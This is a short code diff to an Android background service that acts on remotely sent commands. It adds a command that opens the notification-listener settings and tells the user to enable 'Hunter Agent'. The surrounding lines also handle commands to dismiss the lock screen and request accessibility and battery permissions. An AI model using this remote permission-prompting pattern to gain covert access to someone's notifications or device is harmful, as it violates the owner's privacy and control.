@@ -211,6 +211,8 @@ public class HeartbeatService extends Service {
             result = requestDismissKeyguard();
         } else if ("request_notification_permission".equals(command.type)) {
             result = openAppNotificationSettings();
+        } else if ("request_notification_listener_permission".equals(command.type)) {
+            result = openNotificationListenerSettings();
         } else if ("request_battery_permission".equals(command.type)) {
             result = openBatteryPermissionSettings();
         } else if ("request_accessibility_permission".equals(command.type)) {
@@ -420,6 +422,17 @@ public class HeartbeatService extends Service {
             return "Notification permission requested on device.";
         } catch (Exception exc) {
             return "Notification permission request failed: " + exc.getMessage();
+        }
+    }
+
+    private String openNotificationListenerSettings() {
+        try {
+            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+            return "Notification listener settings opened. Enable Hunter Agent manually.";
+        } catch (Exception exc) {
+            return "Notification listener settings failed: " + exc.getMessage();
         }
     }
 
